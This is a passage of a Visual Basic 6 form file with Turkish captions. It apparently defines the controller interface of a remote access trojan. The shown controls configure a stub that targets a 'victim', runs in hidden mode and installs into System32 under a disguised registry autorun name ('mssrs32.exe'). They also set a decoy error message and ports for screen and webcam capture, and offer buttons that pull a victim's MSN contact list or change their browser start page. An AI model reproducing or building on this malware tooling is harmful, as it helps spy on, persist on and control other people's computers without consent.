            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   38
         Left            =   0
         TabIndex        =   260
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   16
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   250
      Top             =   5400
      Width           =   6735
      Begin Client.cmd btn 
         Height          =   495
         Index           =   107
         Left            =   6120
         TabIndex        =   251
         ToolTipText     =   "msn kiþi listesini al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":2137C
         PICN            =   "Form1.frx":21696
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   108
         Left            =   6120
         TabIndex        =   252
         ToolTipText     =   "msn kiþi listesini kaydet"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":219E8
         PICN            =   "Form1.frx":21D02
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   109
         Left            =   6120
         TabIndex        =   253
         ToolTipText     =   "msn kiþi listesini temizle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":22054
         PICN            =   "Form1.frx":2236E
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4695
         Index           =   8
         Left            =   120
         TabIndex        =   255
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   8281
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "imlist"
         SmallIcons      =   "imlist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Msn Adresi"
            Object.Width           =   4939
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Kiþisel Ýleti"
            Object.Width           =   4939
         EndProperty
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Msn Messenger Kiþi Listesi"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   44
         Left            =   0
         TabIndex        =   254
         Top             =   0
         Width           =   6735
      End
   End
   Begin MSComctlLib.ProgressBar bar 
      Height          =   8895
      Left            =   9600
      TabIndex        =   248
      Top             =   360
      Width           =   135
      _ExtentX        =   238
      _ExtentY        =   15690
      _Version        =   393216
      BorderStyle     =   1
      Appearance      =   0
      Orientation     =   1
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   15
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   233
      Top             =   5040
      Width           =   6735
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Internet Explorer Baþlangýç Sayfasini Deðiþtir"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   26
         Left            =   120
         TabIndex        =   241
         Top             =   4200
         Width           =   6495
         Begin VB.TextBox txtinternetexplorer 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   2
            Left            =   120
            TabIndex        =   242
            Top             =   360
            Width           =   5655
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   106
            Left            =   5880
            TabIndex        =   243
            ToolTipText     =   "internet explorer baþlangýc sayfasini deðiþtir"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":226C0
            PICN            =   "Form1.frx":229DA
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Internet Explorer Baþlangýç Sayfasýný Öðren"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   25
         Left            =   120
         TabIndex        =   238
         Top             =   2160
         Width           =   6495
         Begin VB.TextBox txtinternetexplorer 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   1
            Left            =   120
            TabIndex        =   239
            Top             =   360
            Width           =   5655
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   105
            Left            =   5880
            TabIndex        =   240
            ToolTipText     =   "Internet Explorer Baþlangýç Sayfasýný Öðren"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":22D2C
            PICN            =   "Form1.frx":23046
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Web Sitesine Baðlan"
         ForeColor       =   &H80000008&
         Height          =   855
         Index           =   24
         Left            =   120
         TabIndex        =   235
         Top             =   360
         Width           =   6495
         Begin VB.TextBox txtinternetexplorer 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   0
            Left            =   120
            TabIndex        =   236
            Top             =   360
            Width           =   5655
         End
         Begin Client.cmd btn 
            Height          =   495
            Index           =   104
            Left            =   5880
            TabIndex        =   237
            ToolTipText     =   "Web sayfasina baðlan"
            Top             =   240
            Width           =   495
            _ExtentX        =   873
            _ExtentY        =   873
            BTYPE           =   3
            TX              =   ""
            ENAB            =   -1  'True
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":23398
            PICN            =   "Form1.frx":236B2
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Internet Explorer Ayarlarý"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   23
         Left            =   0
         TabIndex        =   234
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   14
      Left            =   9720
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   182
      Top             =   360
      Width           =   6735
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Kurbanýn Adý"
         ForeColor       =   &H80000008&
         Height          =   645
         Index           =   20
         Left            =   120
         TabIndex        =   229
         Top             =   2280
         Width           =   2295
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   8
            Left            =   840
            MaxLength       =   15
            TabIndex        =   230
            Text            =   "Victim"
            Top             =   240
            Width           =   1335
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Name :"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   25
            Left            =   120
            TabIndex        =   231
            Top             =   255
            Width           =   510
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Yükleme Dizini"
         ForeColor       =   &H80000008&
         Height          =   645
         Index           =   21
         Left            =   2520
         TabIndex        =   225
         Top             =   3480
         Width           =   4095
         Begin VB.OptionButton servereditorinstall 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "System32"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   2
            Left            =   2880
            MousePointer    =   99  'Custom
            TabIndex        =   228
            Top             =   285
            Value           =   -1  'True
            Width           =   1095
         End
         Begin VB.OptionButton servereditorinstall 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Temp"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   1
            Left            =   1440
            MousePointer    =   99  'Custom
            TabIndex        =   227
            Top             =   285
            Width           =   1095
         End
         Begin VB.OptionButton servereditorinstall 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Windows"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   0
            Left            =   90
            MousePointer    =   99  'Custom
            TabIndex        =   226
            Top             =   285
            Width           =   1095
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Server Modu"
         ForeColor       =   &H80000008&
         Height          =   645
         Index           =   23
         Left            =   2520
         TabIndex        =   222
         Top             =   4200
         Width           =   3375
         Begin VB.OptionButton servereditorservermode 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Yardým Modu"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   1
            Left            =   2040
            MousePointer    =   99  'Custom
            TabIndex        =   224
            Top             =   285
            Width           =   1275
         End
         Begin VB.OptionButton servereditorservermode 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Gizli Mod"
            ForeColor       =   &H80000008&
            Height          =   195
            Index           =   0
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   223
            Top             =   285
            Value           =   -1  'True
            Width           =   1215
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Baðlantý Süresi"
         ForeColor       =   &H80000008&
         Height          =   645
         Index           =   19
         Left            =   120
         TabIndex        =   218
         Top             =   3120
         Width           =   2295
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   7
            Left            =   525
            MaxLength       =   2
            TabIndex        =   219
            Text            =   "10"
            Top             =   270
            Width           =   375
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "snde tekrar bglan"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   27
            Left            =   960
            TabIndex        =   221
            Top             =   270
            Width           =   1260
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Süre:"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   26
            Left            =   120
            TabIndex        =   220
            Top             =   270
            Width           =   390
         End
      End
      Begin MSComctlLib.ProgressBar servereditorbar 
         Height          =   135
         Left            =   2520
         TabIndex        =   217
         Top             =   4920
         Width           =   4095
         _ExtentX        =   7223
         _ExtentY        =   238
         _Version        =   393216
         BorderStyle     =   1
         Appearance      =   0
         Scrolling       =   1
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Sahte Hata Mesajý Ayarlarý"
         ForeColor       =   &H80000008&
         Height          =   1965
         Index           =   16
         Left            =   2520
         TabIndex        =   204
         Top             =   360
         Width           =   4095
         Begin VB.CheckBox servereditorchc 
            Appearance      =   0  'Flat
            BackColor       =   &H80000005&
            Caption         =   "Sahte hata mesajý görüntülensin"
            ForeColor       =   &H80000008&
            Height          =   255
            Index           =   0
            Left            =   120
            MousePointer    =   99  'Custom
            TabIndex        =   209
            Top             =   240
            Width           =   2655
         End
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            Enabled         =   0   'False
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   10
            Left            =   1200
            MaxLength       =   25
            TabIndex        =   206
            Text            =   "Error!"
            Top             =   600
            Width           =   1335
         End
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            Enabled         =   0   'False
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   9
            Left            =   1200
            MaxLength       =   25
            TabIndex        =   205
            Text            =   "biodox was here"
            Top             =   960
            Width           =   2775
         End
         Begin Client.cmd servereditorfakemsjsimge 
            Height          =   585
            Index           =   0
            Left            =   1200
            TabIndex        =   211
            ToolTipText     =   "16"
            Top             =   1320
            Width           =   615
            _ExtentX        =   1085
            _ExtentY        =   1032
            BTYPE           =   8
            TX              =   ""
            ENAB            =   0   'False
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":23BB4
            PICN            =   "Form1.frx":23ECE
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd servereditorfakemsjsimge 
            Height          =   585
            Index           =   1
            Left            =   1920
            TabIndex        =   212
            ToolTipText     =   "48"
            Top             =   1320
            Width           =   615
            _ExtentX        =   1085
            _ExtentY        =   1032
            BTYPE           =   8
            TX              =   ""
            ENAB            =   0   'False
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":24AC0
            PICN            =   "Form1.frx":24DDA
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd servereditorfakemsjsimge 
            Height          =   585
            Index           =   2
            Left            =   2640
            TabIndex        =   213
            ToolTipText     =   "64"
            Top             =   1320
            Width           =   615
            _ExtentX        =   1085
            _ExtentY        =   1032
            BTYPE           =   8
            TX              =   ""
            ENAB            =   0   'False
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":25950
            PICN            =   "Form1.frx":25C6A
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd servereditorfakemsjsimge 
            Height          =   585
            Index           =   3
            Left            =   3360
            TabIndex        =   214
            ToolTipText     =   "32"
            Top             =   1320
            Width           =   615
            _ExtentX        =   1085
            _ExtentY        =   1032
            BTYPE           =   8
            TX              =   ""
            ENAB            =   0   'False
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   700
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":268BC
            PICN            =   "Form1.frx":26BD6
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin Client.cmd btn 
            Height          =   285
            Index           =   102
            Left            =   2640
            TabIndex        =   215
            ToolTipText     =   "Select Icon"
            Top             =   600
            Width           =   1335
            _ExtentX        =   2355
            _ExtentY        =   503
            BTYPE           =   3
            TX              =   "Test Message"
            ENAB            =   0   'False
            BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
               Name            =   "Tahoma"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            COLTYPE         =   2
            FOCUSR          =   -1  'True
            BCOL            =   16777215
            BCOLO           =   16777215
            FCOL            =   0
            FCOLO           =   0
            MCOL            =   12632256
            MPTR            =   99
            MICON           =   "Form1.frx":27828
            UMCOL           =   -1  'True
            SOFT            =   0   'False
            PICPOS          =   0
            NGREY           =   0   'False
            FX              =   0
            HAND            =   -1  'True
            CHECK           =   0   'False
            VALUE           =   0   'False
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Mesaj Simgesi :"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   32
            Left            =   120
            TabIndex        =   210
            Top             =   1320
            Width           =   1095
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Msj Baþlýðý :"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   30
            Left            =   120
            TabIndex        =   208
            Top             =   600
            Width           =   825
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Mesaj : "
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   31
            Left            =   120
            TabIndex        =   207
            Top             =   960
            Width           =   570
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Registry Ayarlarý"
         ForeColor       =   &H80000008&
         Height          =   1005
         Index           =   22
         Left            =   120
         TabIndex        =   199
         Top             =   4050
         Width           =   2295
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   6
            Left            =   960
            MaxLength       =   16
            TabIndex        =   202
            Text            =   "mssrs32.exe"
            Top             =   600
            Width           =   1215
         End
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   5
            Left            =   960
            MaxLength       =   16
            TabIndex        =   200
            Text            =   "mssrs32"
            Top             =   240
            Width           =   1215
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Deðer : "
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   29
            Left            =   120
            TabIndex        =   203
            Top             =   600
            Width           =   585
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Anahtar : "
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   28
            Left            =   120
            TabIndex        =   201
            Top             =   240
            Width           =   735
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "Port Ayarlarý"
         ForeColor       =   &H80000008&
         Height          =   1005
         Index           =   18
         Left            =   2520
         TabIndex        =   190
         Top             =   2400
         Width           =   4095
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   4
            Left            =   3360
            MaxLength       =   5
            TabIndex        =   198
            Top             =   600
            Width           =   615
         End
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   3
            Left            =   3360
            MaxLength       =   5
            TabIndex        =   197
            Top             =   240
            Width           =   615
         End
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   2
            Left            =   1200
            MaxLength       =   5
            TabIndex        =   196
            Top             =   600
            Width           =   615
         End
         Begin VB.TextBox servereditortxt 
            Appearance      =   0  'Flat
            BeginProperty Font 
               Name            =   "MS Sans Serif"
               Size            =   8.25
               Charset         =   162
               Weight          =   400
               Underline       =   0   'False
               Italic          =   0   'False
               Strikethrough   =   0   'False
            EndProperty
            Height          =   285
            Index           =   1
            Left            =   1200
            MaxLength       =   5
            TabIndex        =   191
            Top             =   240
            Width           =   615
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "webcam görüntüsü:"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   35
            Left            =   1920
            TabIndex        =   195
            Top             =   600
            Width           =   1425
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Ekran Görüntüsü :"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   37
            Left            =   1920
            TabIndex        =   194
            Top             =   240
            Width           =   1305
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Transfer :"
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   36
            Left            =   120
            TabIndex        =   193
            Top             =   600
            Width           =   720
         End
         Begin VB.Label lbl 
            Appearance      =   0  'Flat
            AutoSize        =   -1  'True
            BackColor       =   &H00000080&
            BackStyle       =   0  'Transparent
            Caption         =   "Baðlantý : "
            ForeColor       =   &H00000000&
            Height          =   195
            Index           =   33
            Left            =   120
            TabIndex        =   192
            Top             =   240
            Width           =   720
         End
      End
      Begin VB.Frame fun 
         Appearance      =   0  'Flat
         BackColor       =   &H80000005&
         Caption         =   "IP / DNS"
